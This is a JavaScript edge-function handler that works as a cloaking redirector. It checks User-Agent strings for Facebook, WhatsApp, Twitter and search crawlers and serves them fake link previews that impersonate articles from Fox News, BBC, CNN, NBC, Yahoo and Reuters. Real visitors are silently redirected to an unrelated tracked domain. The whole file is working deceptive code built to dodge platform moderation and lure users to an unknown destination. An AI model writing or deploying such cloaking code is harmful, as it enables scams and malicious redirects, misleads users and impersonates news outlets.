export async function onRequest(context) {
  const urlObj = new URL(context.request.url);

  // Static files check
  if (urlObj.pathname.match(/\.(jpg|jpeg|png|webp|gif|ico|svg|css|js)$/i)) {
    return context.next();
  }

  const userAgent = (context.request.headers.get("User-Agent") || "").toLowerCase();
  
  // Facebook, Instagram, WhatsApp, Twitter aur search engine bots check
  const isBot = /facebookexternalhit|facebot|facebookcatalog|meta-externalagent|twitterbot|whatsapp|telegrambot|linkedinbot|googlebot|bingbot/i.test(userAgent);
  
  const targetRedirect = "https://b.urlxx335.com?utm_source=jack&utm_medium=pari67";

  // Exact News Articles & Real CDN Images
  const newsArticles = [
    {
      siteName: "FOX NEWS",
      title: "Lost city where Jesus performed miracles has finally been identified, expert says",
      description: "Archaeological excavation and historical research reveal major discovery in Bethsaida.",
      articleUrl: "https://www.foxnews.com/travel/lost-city-where-jesus-performed-miracles-has-finally-been-identified-expert-says",
      image: "https://a57.foxnews.com/static.foxnews.com/foxnews.com/content/uploads/2026/09/1440/810/ISRAEL-BETHSAIDA-EXCAVATION-ANCIENT-HISTORY-ARCHAEOLOGY-DISCOVERY-1.jpg?ve=1&tl=1"
    },
    {
      siteName: "BBC SPORT",
      title: "Live Football Coverage & Breaking Sports Updates",
      description: "Read full analysis, key match highlights, and official team statements.",
      articleUrl: "https://www.bbc.com/sport/football/articles/c4g5kxrw6e9o",
      image: "https://ichef.bbci.co.uk/ace/standard/976/cpsprodpb/ada7/live/27df4c70-9658-11f1-b2ab-0dd01740f9f6.jpg.webp"
    },
    {
      siteName: "YAHOO NEWS",
      title: "US deployed space weapon in air defense updates: Full report",
      description: "Officials deliver key briefing regarding recent aerospace and defense operations.",
      articleUrl: "https://www.yahoo.com/news/politics/articles/us-deployed-space-weapon-air-015206073.html",
      image: "https://s.yimg.com/lo/mysterio/api/3872e57c1946419bc3f7c67cd85099c8450a429140d1be5545202ed26a4bd231/lightyear_networkapi/resizefill_w976%3Bquality_80%3Bformat_webp/https%3A%2F%2Fmedia.zenfs.com%2Fen%2Fbbc_us_articles_995%2F434bd3b30023bffbf91e8c929d7c87db.jpg"
    },
    {
      siteName: "CNN",
      title: "Emmys 2026: Complete Winners List and Top Moments",
      description: "See full coverage of the awards show, top speeches, and major winning moments.",
      articleUrl: "https://edition.cnn.com/2026/09/14/entertainment/emmys-2026-winners-list",
      image: "https://media.cnn.com/api/v1/images/stellar/prod/2026-09-15t030023z-346743246-hp1em9f08ckld-rtrmadp-3-awards-emmys.JPG?c=original&q=w_860,c_fill/f_avif"
    },
    {
      siteName: "NBC NEWS",
      title: "Emmys 2026 Winners & Red Carpet Highlights: Live Updates",
      description: "Live results, celebrity arrivals, and behind-the-scenes coverage from the event.",
      articleUrl: "https://www.nbcnews.com/pop-culture/awards/live-blog/emmys-2026-winners-live-updates-rcna594424",
      image: "https://media-cldnry.s-nbcnews.com/image/upload/c_fill,q_auto:eco,w_560,h_374/rockcms/2026-09/260914-Mariska-Hargitay-Emmy-Award-vsb-2309-d59b47.avif"
    },
    {
      siteName: "REUTERS",
      title: "All the Styles: Emmys Red Carpet Official Photo Gallery",
      description: "Exclusive photo coverage of arrivals and standout moments from the red carpet.",
      articleUrl: "https://www.reuters.com/pictures/all-styles-emmys-red-carpet-2026-09-14/",
      image: "https://www.reuters.com/resizer/v2/HEOYMIN25VNWFA4VE5YUOK6PNM.jpg?auth=4af07b3c19c5167a2124f80bf93ac9186fb4e012ccc80047b3aec4160921723e&width=1920&quality=80"
    }
  ];

  // Pick random article for crawler preview
  const randomArticle = newsArticles[Math.floor(Math.random() * newsArticles.length)];

  // Facebook Bot/Scraper Response
  if (isBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${randomArticle.title}</title>
  
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="${randomArticle.siteName}">
  <meta property="og:title" content="${randomArticle.title}">
  <meta property="og:description" content="${randomArticle.description}">
  <meta property="og:image" content="${randomArticle.image}">
  <meta property="og:image:secure_url" content="${randomArticle.image}">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="${randomArticle.articleUrl}">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${randomArticle.title}">
  <meta name="twitter:description" content="${randomArticle.description}">
  <meta name="twitter:image" content="${randomArticle.image}">
</head>
<body>
  <h1>${randomArticle.title}</h1>
  <p>${randomArticle.description}</p>
</body>
</html>`;

    return new Response(html, {
      headers: {
        "Content-Type": "text/html;charset=UTF-8",
        "Cache-Control": "public, max-age=3600"
      }
    });
  }

  // Real User Response (Direct Redirection)
  const userHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${randomArticle.title}</title>
  <script>
    setTimeout(function() {
      window.location.replace("${targetRedirect}");
    }, 100);
  </script>
</head>
<body style="font-family: sans-serif; text-align: center; padding-top: 60px; color: #444;">
  <p>Loading full story, please wait...</p>
</body>
</html>`;

  return new Response(userHtml, {
    headers: {
      "Content-Type": "text/html;charset=UTF-8"
    }
  });
}